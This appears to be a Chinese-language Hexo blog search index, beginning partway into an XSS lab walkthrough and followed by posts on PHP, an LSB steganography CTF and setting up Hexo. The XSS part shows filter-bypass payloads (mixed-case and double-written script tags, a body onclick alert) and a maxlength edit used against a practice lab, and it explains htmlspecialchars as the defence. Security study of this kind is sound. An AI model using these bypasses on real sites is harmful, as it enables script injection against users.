ScRipt&gt;alert(/sl/)&lt;/ script&gt;这样来实现结果。<br><img src="/2019/07/09/XSS/rezOK2.PNG" alt="Image"><br>PS：这个地方由于只是用了一个过滤，我们可以用其他的方法绕过去，继续进行。<br>例如双写绕过的写法PS：我又把&lt;&gt;加上了这样看起来方便，只是源代码的‘&lt;’后面有一个空格记得清除。</p><p>&lt; sc&lt; script&gt;ript&gt;alert(/sl/)&lt;/ script&gt;<br>使用这个双写绕过的写法看到str_replace() 函数把包裹在外层的 &lt; script&gt;给过滤掉了，但是我里面的语句并不会过滤掉，这样的话 我内部的语句同样来说可以继续执行下去。测试木的问题。成功。<br>进入下一个等级</p><h4 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h4><p> 进入高级节奏，输入之前的命令试试吧 我们输入之前初级的语句，尝试看看它过滤掉了什么。<br> <img src="/2019/07/09/XSS/G1.PNG" alt="Image"><br> 结果输入进去发现只剩下了个‘&gt;’ 。。。这样的情况，还是看看源代码比较好。<img src="/2019/07/09/XSS/G1YM.PNG" alt="Image"><br> 这里我看到了一个新的函数preg_replace（）函数  个人不太懂所以去搜索了一下，得到的是这样的结果。</p><p> preg_replace 函数执行一个正则表达式的搜索和替换。个人还是不太懂，于是我又去详细的了解了一下。<br> 例如:$str=”as2223adfsf0s4df0sdfsdf”;</p><p>echo preg_replace(“/0/“,””,$str);</p><p>这里的意思是去掉0字符，此时相当于 replace的功能, preg_replace(“/0/“,”A”,$str); 这样就是将0变成A的意思了<br>这样来看就比较明了了。 ps:匹配的字符串必须加/ / （可以看看第一个参数）</p><p>弄清楚了这个函数的意义，我们再看这个题 可以看到他把script给完全过滤掉了 这里有点小问题，它把script给过滤了，。。。我该用什么去弹窗。。。 除了script我们还可以用HTML标记语言来进行啊。我尝试了”onclick=”window.alert() 发现并没有成功，参考大佬的blog发现可以使用body进行弹窗输出。于是使用了</p><p>&lt; body onclick=alert(/sl/)&gt;来进行实验，结果成功弹出窗口。<br><img src="/2019/07/09/XSS/G1JG.PNG" alt="Image"></p><p>接下来。。尝试impossible</p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><p> 看到这个等级 impossible 不可绕过。这还没进行尝试他就给你说了难度。不过还是要去尝试一下。这里我选择了直接看源码。<br> <img src="/2019/07/09/XSS/im1.PNG" alt="Image"><br> 发现了htmlspecia1chars（）这个函数，不懂的我，再次求助了度娘。<br>发现它的作用:传入字符串$html,将$html中包含&lt;&gt;等HTML中预留的字符,转换成字符实体,返回转换后的字符串</p><p>定义和用法</p><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><pre><code>&amp; （和号）成为 &amp;&quot; （双引号）成为 &quot;&apos; （单引号）成为 &apos;&lt; （小于）成为 &lt;&gt; （大于）成为 &gt;</code></pre><p>PS：如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数</p><p>它的应用场景:</p><pre><code>a.想在HTML中直接显示源码(等同右击=&gt;查看源码效果),此时可以使用htmlspecialchars()对想输出的源码进行转义;b.文本过滤:在表单页,防止恶意注入,如在输入框中输入&lt;?php $sql=&quot;drop tabal user&quot;;mysql_query($sql); ?&gt;,此时使用htmlspecialchars()转义后,该脚本中的&lt;&gt;将会被转为字符实体,在php中不会执行.</code></pre><p>可以看出这个用来防注入字符是最好不过的了。</p><h3 id="2-储存型XSS"><a href="#2-储存型XSS" class="headerlink" title="2.储存型XSS"></a>2.储存型XSS</h3><p>这里我们试着通过练习来了解储存型的XSS攻击。依旧是从低向高进行。</p><h4 id="初级-1"><a href="#初级-1" class="headerlink" title="初级"></a>初级</h4><p> 我们同样开始进行尝试。输入语句。这时发现<img src="/2019/07/09/XSS/S1CS.PNG" alt="Image">它在页面上对字符的长度进行了一定的限制，这时候我们打开控制台，进行一个临时的编译，将输入字符串的长度进行更改。<br> <img src="/2019/07/09/XSS/S1JG.PNG" alt="Image"><br> 图中可以看到光标所选中的那一行。有这样maxlength=”30”这是我修改过的，修改之前的为10.修改后就可以看到能够输入进去了。<br> 输入之前的命令 发现没有啥改变 于是我又进行了一番摸索，发现之前的理解还是不够，最终摸索到了<img src="/2019/07/09/XSS/S1JG1.PNG" alt="Image"><br> 之后继续随便输入了name：test与 message：123123 之后出现了弹窗，之后的每一次输入都出现了刚才语句中间的内容。</p><p> 每当进入一个新的界面都会出现一个弹窗。</p><p> 小结：这时更清楚了储存型与反射型的不同的地方，储存型是持续，持久的进行弹窗。反射性不同，与之相反。</p><h4 id="中级-1"><a href="#中级-1" class="headerlink" title="中级"></a>中级</h4><p> 同样使用初级语句进行测试。<br> <img src="/2019/07/09/XSS/S2ZC.PNG" alt="Image"><br>可以看到我们输入的name是 alert(/sl/)。这时候我们查看一下源代码。<img src="/2019/07/09/XSS/S2CSYM.PNG" alt="Image"></p><p>可以看到它过滤掉的字符在这里<img src="/2019/07/09/XSS/S2ZYM1.PNG" alt="Image"><br>SCRIPT整个被过滤掉了，这时我们仍然可以使用之前在反射型XSS中的绕过语句。<br>双写绕过，以及大小写绕过。<br>&lt; body onclick=alert(/sl/)&gt;<br>&lt; ScRipt&gt;alert(/sl/)&lt;/ script&gt;<br>&lt; sc&lt; script&gt;ript&gt;alert(/sl/)&lt;/ script&gt;<br>这些语句均可以使用。<img src="/2019/07/09/XSS/S2ZJ.PNG" alt="Image"><br>这时候都出现了弹窗。我们已经成功的注入进去了。</p><h4 id="高级-1"><a href="#高级-1" class="headerlink" title="高级"></a>高级</h4><p>接下来我们步入高级的节奏。同样输入语句进行一个小小的注入测试。我们可以看到写进去的name <img src="/2019/07/09/XSS/SG1.PNG" alt="Image">被过滤的只剩一个”&gt;” 它的过滤类型应该跟之前反射型的高级模式是一样的 。我们查看一下源代码。<img src="/2019/07/09/XSS/SG1YM.PNG" alt="Image"><br>源码中的语句<img src="/2019/07/09/XSS/SG1J.PNG" alt="Image"><br>可以看到还是同样的preg_replace()函数依旧执行一个正则表达式的搜索和替换。<br>继续通过上次成功的语句&lt; body onclick=alert(/sl/)&gt;来进行实验。<br><img src="/2019/07/09/XSS/SG1JG1.PNG" alt="Image"><br>成功的可以看到弹窗 依次进行实验同样可以是持久性的弹窗。</p><h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><p> 有道理impossible 不可绕过的情况 我们一样直接进入，直接查看源码。<img src="/2019/07/09/XSS/im2.PNG" alt="Image"><br> 发现在输出那有一个htmlspecialchars() 函数，所以这个原理就和反射型XSS攻击一样.这里就简单的进行了对XSS熟悉的练习。通过这些练习，我们可以更深入的了解了XSS的不同类型的不同特点。</p><h2 id="总结与感悟"><a href="#总结与感悟" class="headerlink" title="总结与感悟"></a>总结与感悟</h2><h3 id="对字符转义的总结"><a href="#对字符转义的总结" class="headerlink" title="对字符转义的总结"></a>对字符转义的总结</h3><p> <img src="/2019/07/09/XSS/ZFZY.PNG" alt="Image"><br> 简单了解的判定<br> <img src="/2019/07/09/XSS/ZY.PNG" alt="Image"></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p> 通过这次的XSS学习与了解，能够更深入的了解到XSS的原理，特征，以及不同的注入方式，注入语句。<br> 只有动手去实践一遍，去实际的操作，才能更好的了解，通过写blog记录下下来，能够帮助自己更好的找到问题，梳理清楚自己的问题与思路所在。总之，还是需要继续努力，继续向前。</p><p> 加油！前面的路还很遥远。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP个人学习记录</title>
      <link href="/2019/04/06/PHP/"/>
      <url>/2019/04/06/PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博客记录了学习PHP中的个人理解与重要的知识点。能够更好的巩固自己所学习的知识。</p><h2 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h2><p>PHP 它的英文名称：Hypertext Preprocessor （学习过程中顺便记个单词） 它的中文名称：超文本预处理器。 PHP是一种开源脚本语言。主要适用于Web开发领域，PHP是一个应用范围很广的语言，特别是在网络程序开发方面。一般来说PHP大多在服务端运行，透过运行PHP的代码来产生网页提供浏览器读取，此外也可以用来开发命令行脚本程序和用户端的GUI应用程序。PHP可以在许多的不同种的服务器、操作系统、平台上运行，也可以和许多数据库系统结合。使用PHP不需要任何费用，官方组织PHP Group提供了完整的程序源代码，允许用户修改、编译、扩展来使用。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB隐写</title>
      <link href="/2019/04/05/LSB/"/>
      <url>/2019/04/05/LSB/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>平台上自己尝试着解了一些有关于图片隐写的问题，对于LSB隐写题目的一些学习与理解，以及个人的解题思路。</p><h2 id="LSB简介"><a href="#LSB简介" class="headerlink" title="LSB简介"></a>LSB简介</h2><p>LSB，称为：最低有效位，它的英文是Least Significant Bit 。我们知道图像像素一般是由RGB三原色（即红绿蓝）组成的，每一种颜色占用8位，0x00~0xFF，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量种最低的二进制位的时候，我们的肉眼是区分不出来的。LSB加密是信息隐藏中最基本的方法。古人的藏头诗也算是一种隐写。</p><p><img src="/2019/04/05/LSB/jian.png" alt="Image"></p><h2 id="对最低有效位的意思解析"><a href="#对最低有效位的意思解析" class="headerlink" title="对最低有效位的意思解析"></a>对最低有效位的意思解析</h2><p>png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br><img src="/2019/04/05/LSB/lj.png" alt="Image"><br>十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。我修改最低有效位的信息的算法就叫做lsb加密算法，提取最低有效位信息的算法叫做lsb解密算法。<br><img src="/2019/04/05/LSB/lj01.png" alt="Image"><br><img src="/2019/04/05/LSB/lj02.png" alt="Image"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>解题必然会有工具这里， 在这里使用一款功能很强大的lsb隐写分析工具—StegSolve图片通道查看器。使用这个工具记得首先安装JDK配置JAVA环境，然后再使用StegSolve。<br>下面是我使用的JDK以及配置好后的StegSolve图标。<br><img src="/2019/04/05/LSB/java.png" alt="Inage"></p><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>之后看题目用stegsolve打开看到这张图片。<br><img src="/2019/04/05/LSB/java01.png" alt="Image"><br>使用stegsolve打开图片，按右方向键查看各通道显示的图像。一般有些题目会在某一个图像通道中直接显示出flag，但是显然这题不行，看来还需要绕些弯，要获取最低位的图片信息。<br>打开后使用Data Extract: 数据抽取，图片中隐藏数据的抽取。可以看到<img src="/2019/04/05/LSB/java05.png" alt="Image"><br>这时 看到这 突然会不知道如何去选择，或者乱选一气，当然这绝对出不来。那么我们应该如何去点。回到最开始的图片中<img src="/2019/04/05/LSB/java01.png" alt="Image">向右边一直翻动会发现<br>alpha plane7-0全是一个颜色没有任何变化，之后继续翻动会发现</p><p><img src="/2019/04/05/LSB/java02.png" alt="Image"></p><p>Red plane0这里左上角好像有些字符 继续翻动</p><p><img src="/2019/04/05/LSB/java03.png" alt="Image"><br>green plane0 左上角也同样有字符一样继续翻动</p><p><img src="/2019/04/05/LSB/java04.png" alt="Image"><br>blue  plane0左上角也有。这时候回到图片分析里  看到bit planes看到里面有通道选择 对应上面的三个0通道选择<img src="/2019/04/05/LSB/java05.png" alt="Image"><br>同时bit order 选择LSB一栏点击预览 可以得到<img src="/2019/04/05/LSB/java06.png" alt="Image">这时候看到上面有编码出现向上拉动，会发现flag<img src="/2019/04/05/LSB/java05.png" alt="Image"><br>这里我们就拿到了这道题的flag 就是 have a good time！</p><p>同样 第二道LSB 跟上述一样选择好通道一样可解出来<br><img src="/2019/04/05/LSB/TM01.png" alt="Image"><br>具体操作更上述一样就不在一一举出了。</p><p>这是我这个小白的解题思路，如有出错还请大佬轻喷。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo搭建个人博客+主题更换</title>
      <link href="/2019/03/16/hello-world/"/>
      <url>/2019/03/16/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于个人博客的搭建过程，个人在这里面踩了很多的坑，初次搭建的不算成功，还好有团队的教学与学长的经验相助，在努力下搭建了我的个人博客。在此总结我在搭建的一些过程。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>本次过程只适用于windows的用户。用于个人学习记录。  </p><h3 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h3><p>一、Nodejs的安装</p><p>二、Git安装</p><p>三、GitHub创建个人仓库</p><p>四、配置SSH key</p><p>五、Hexo安装</p><p>六、发布网站</p><p>七、更改主题</p><h3 id="一、Nodejs的安装"><a href="#一、Nodejs的安装" class="headerlink" title="一、Nodejs的安装"></a>一、Nodejs的安装</h3><p>Hexo基于Node.js的，搭建博客网站首先需要安装Node.js环境。<br><img src="/2019/03/16/hello-world/nodejs.png" alt="Image text"></p><p>下载地址：http:\nodejs.cn\download<br>测试安装：命令行使用node -v 、npm -v，查看显示版本号即成功。<br>打开cmd命令行，成功界面如下<br><img src="/2019/03/16/hello-world/success.png" alt="Image text"></p><h3 id="二、Git安装"><a href="#二、Git安装" class="headerlink" title="二、Git安装"></a>二、Git安装</h3><p>网站在本地搭建好了，需要使用Git同步到GitHub上。</p><p>首先访问https:\git-scm.com\ 下载完毕后进入安装界面进行安装。<br><img src="/2019/03/16/hello-world/git01.png" alt="Image"></p><p><img src="/2019/03/16/hello-world/git02.png" alt="Image"></p><p>正常安装后使用git –version的命令来测试git是否安装成功。</p><p><img src="/2019/03/16/hello-world/git03.png" alt="Image"></p><p>到这里git就已经安装成功了！</p><h3 id="三、GitHub创建个人仓库"><a href="#三、GitHub创建个人仓库" class="headerlink" title="三、GitHub创建个人仓库"></a>三、GitHub创建个人仓库</h3><p>1.首先登录https:\github.com 进行账户注册和新建项目。此处由于之前创建过所以无法创建。在这里需要注意目必须要遵守格式：你的账户名.github.io。并且需要勾选Initialize this repository with a README。</p><p><img src="/2019/03/16/hello-world/github01.png" alt="Image"></p><p>在建好的项目右侧有个settings按钮，点击它，向下拉到GitHub Pages，你会看到那边有个网址，访问它，你会现该项目已经被部署到网络上，能够通过外网来访问它。如下图所示：</p><p><img src="/2019/03/16/hello-world/github02.png" alt="Image"></p><h3 id="四、配置SSH-key"><a href="#四、配置SSH-key" class="headerlink" title="四、配置SSH key"></a>四、配置SSH key</h3><p>为了要拥有你的github权限，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。<br><img src="/2019/03/16/hello-world/ssh01.png" alt="Image">使用$ cd ~. ssh #检查本机已存在的ssh密钥。<br><img src="/2019/03/16/hello-world/ssh02.png" alt="Image"></p><p>如果提示：No such file or directory 说明你是第一次使用git。然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：<img src="/2019/03/16/hello-world/ssh03.png" alt="Image"></p><p>之后进行测试是否成功！<img src="/2019/03/16/hello-world/ssh04.png" alt="Image"><br>如果提示Are you sure you want to continue connecting (yes\no)?，输入yes，然后会看到：<img src="/2019/03/16/hello-world/ssh05.png" alt="Image"><br>看到这个信息说明SSH已配置成功！</p><h3 id="五、Hexo安装"><a href="#五、Hexo安装" class="headerlink" title="五、Hexo安装"></a>五、Hexo安装</h3><p>1.首先在自己认为合适的地方创个文件夹，个人是在D盘建了一个hexo然后再建立了blog文件夹。也可以直接建立一个blog文件然后使用DOS命令进入到该文件夹里面。然后输入输入npm install hexo -g，开始安装Hexo.<br>![Image] (hello-world\hexo01.png)<br>完成后，继续输入命令 cnpm install -g hexo-cli<br>![Image]     (hello-world\hexo02.png)</p><p>等待完成，再输入命令 cnpm install hexo –save<br><img src="/2019/03/16/hello-world/hexo03.png" alt="Image"></p><p>至此Hexo安装完成，使用查看版本命令 hexo -v 检查是否正常安装。<img src="/2019/03/16/hello-world/hexo04.png" alt="Image"></p><h3 id="六、发布网站"><a href="#六、发布网站" class="headerlink" title="六、发布网站"></a>六、发布网站</h3><p>1、本地启动<br>创建一个新文件夹（我的是在E盘创建的Blog），进入该文件夹，右键Git Bash Here，输入 hexo init 命令。<br>接下来输入 hexo s -g 命令启动，启动后浏览器访问localhost:4000查看博客效果。</p><p>2、部署到Github<br>本地成功后下面就要部署到Git了，打开_config.yml进行配置，如下图，复制你的仓库地址给repo参数<br><img src="/2019/03/16/hello-world/blog01.png" alt="Image"><br>在Git命令窗口输入 npm install hexo-deployer-git –save 安装hexo-deployer-git自动部署发布工具，等待安装完成，输入 （hexo clean）   （hexo g）   （hexo d） 命令发布到Github，这里注意第一次发布的话会需要输入你的Github账号跟密码，等待出现下图的信息就说明发布成功了，在浏览器输入yourname.github.io就可以看到你的博客了。<img src="/2019/03/16/hello-world/blog02.png" alt="Image"></p><h3 id="七、更改主题"><a href="#七、更改主题" class="headerlink" title="七、更改主题"></a>七、更改主题</h3><p>部署完毕后，可以根据自己的喜好更改自己的主题在hexo的官网中有主题选项然后进行配置更改找到自己喜欢的网站主题。完成配置就好了。</p><h3 id="对于上传图片的问题解决"><a href="#对于上传图片的问题解决" class="headerlink" title="对于上传图片的问题解决"></a>对于上传图片的问题解决</h3><p> 前一段搭建好的个人博客 图片怎么传也传不上去，把图片放在github的库中也没有操作好 ，甚至找了一个破解版的MarkdownPad 2 插入图片也没有成功，对此  差点自闭。 后来在学长的指导下得出了如何简单的上传图片。放下如下</p><p> 1、cd到博客根目录下 查看_config.yml文件<br>    查找 post_asset_folder<br>    字段确定post_asset_folder<br>    设置为true -&gt; post_asset_folder:true</p><p>2、当你设置 post_asset_folder  参数后，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，你可以把与该文章相关的所有资源都放到此文件夹内，这样就可以更方便的使用资源。</p><p>3、到博客的根目录下执行 npm install <a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">https://github.com/CodeFalling/hexo-asset-image</a> –save 命令来进行插件的安装。</p><p>4、然后创建一文章 hexo new “test” 然后查看博客的 ../source/_posts 目录下的文件，会看到存在一个test 文件夹 和 test.md 文件</p><p>5、将需要显示在test.md文件中的图片放到上面命令生成的test文件夹中<br>    在test.md文件中使用命令显示文件，其中中括号的内容会是你在md文件中图片的名字，小括号中的地址的格式为 文件夹名/图片名，例如 test/test.png</p><p>在此终于解决了图片上传的问题，由衷感谢学长的帮助。<br>个人博客，希望能够帮助到一些人，小白第一次发博，还请大佬轻喷。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
